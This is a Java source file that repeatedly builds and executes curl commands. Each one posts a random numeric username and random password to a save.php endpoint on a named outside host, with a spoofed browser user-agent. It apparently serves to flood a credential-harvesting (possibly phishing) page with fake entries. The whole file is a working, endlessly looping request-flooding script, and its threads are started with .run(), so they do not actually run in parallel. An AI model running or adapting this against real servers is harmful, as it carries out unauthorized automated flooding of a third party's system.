import java.io.IOException;
import java.util.Random;

public class Case3 {
	public static String gP() {
		Random r=new Random();
		StringBuilder sb=new StringBuilder();
		for(int i=1;i<=r.nextInt(10)+8;i++) {
			sb.append((char)('a'+r.nextInt(26)));
		}
		// System.out.println(sb.toString());
		return sb.toString();
	}
	public static String gU() {
		Random r=new Random();
		StringBuilder sb=new StringBuilder();
		sb.append(r.nextInt(99900000)+100000);
		// System.out.println(sb.toString());
		return sb.toString();
	}
	public static void main(String[] args) {
for(int i=1;i<=4;i++){
new Thread(() -> {
		while(true) {
			StringBuilder sb=new StringBuilder();
			String s=sb.append("curl -d \"ip=&hrUW3PG7mp3RLd3dJu=").append(gU()).append("&LxMzAX2jog9Bpjs07jP=").append(gP()).append("\" -A \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\" http://www.vipaag.cn/save.php").toString();
			System.out.println(s);
			try {
				Runtime.getRuntime().exec(s);
				// Thread.sleep(1000);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
		}
}).run();
}
	}

}
